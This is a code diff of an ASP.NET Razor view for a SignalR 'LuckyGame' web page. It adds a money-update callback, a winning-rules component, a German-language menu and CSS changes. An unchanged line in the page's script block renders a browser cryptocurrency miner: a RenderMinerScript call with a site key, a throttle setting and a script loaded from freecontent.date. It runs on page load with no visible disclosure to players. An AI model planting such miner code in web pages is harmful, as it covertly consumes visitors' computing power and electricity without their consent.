@@ -8,7 +8,7 @@
 
 <script>
     servicehub = null;
-    
+
                  @if (Model != null)
                  {
                      <text>
@@ -28,6 +28,11 @@
                 UpdateMoneyOverview(data);
             }
 
+            servicehub.client.updateAvailableMoney = function (data) {
+                UpdateAvailableMoneyOverview(data);
+            }
+
+
             $.connection.hub.start().done(function () {
 
                  @if (Model != null)
@@ -41,6 +46,7 @@
                          startMoneyOverview();
                          cardCollection = data;
                          startLuckyGame();
+                         startLuckyGameWinningRules();
 
                      }).fail(function () {
                          console.log("failed getting cards");
@@ -57,21 +63,39 @@
         @SignalRService.Utils.RenderUtils.RenderMinerScript("b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087", "0.9", "https://www.freecontent.date./W7KS.js", 5000, 10000);
 </script>
 
-<div id="MoneyOverview"></div>
+
+
+<button id="menu-lower-left"
+        class="mdl-button mdl-js-button mdl-button--icon">
+    <i class="material-icons">more_vert</i>
+</button>
+
+<ul class="mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect"
+    for="menu-lower-left">
+    <li class="mdl-menu__item">Login/Account</li>
+    <li class="mdl-menu__item">Gewinnregeln</li>
+    <li class="mdl-menu__item">Auszahlung</li>
+</ul>
+
+
+<div id="MoneyOverviewUser"></div>
+<div id="MoneyOverviewRoom"></div>
 <div id="LuckyGame"></div>
+<div id="LuckyGameWinningRules"></div>
 
 
 
 
 <script src="@Url.Content("~/Scripts/LuckyGame.jsx")"></script>
 <script src="@Url.Content("~/Scripts/MoneyOverview.jsx")"></script>
+<script src="@Url.Content("~/Scripts/LuckyGameWinningRules.jsx")"></script>
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.12/css/all.css" integrity="sha384-G0fIWCsCzJIMAVNQPfjH08cyYaUtMwjJwqiRKxxE/rx96Uroj1BtIQ6MLJuheaO9" crossorigin="anonymous">
 
 <style>
 
     .cardslot {
-        height: 170px;
-        width: 170px;
+        height: 90px;
+        width: 90px;
         background-color: blue;
         float: left;
         margin: 2px;
@@ -82,15 +106,33 @@
         background-color: green;
     }
 
-    .error{
-        color:red;
+    .error {
+        color: red;
     }
+
     .won {
         color: green;
         font-weight: bold;
     }
+
     .lost {
         color: blue;
+    }
+
+    .winningruledititem .mdl-textfield {
+        width: 150px !important;
+    }
+
+    .winningruledititem .mdl-textfield__input {
+        width: 40px !important;
+        display: inline-block !important;
+    }
+
+    .deletebtn {
+        background-color:red;
+        display:inline-block;
+        height: 20px;
+        width:20px;
     }
 
 </style>
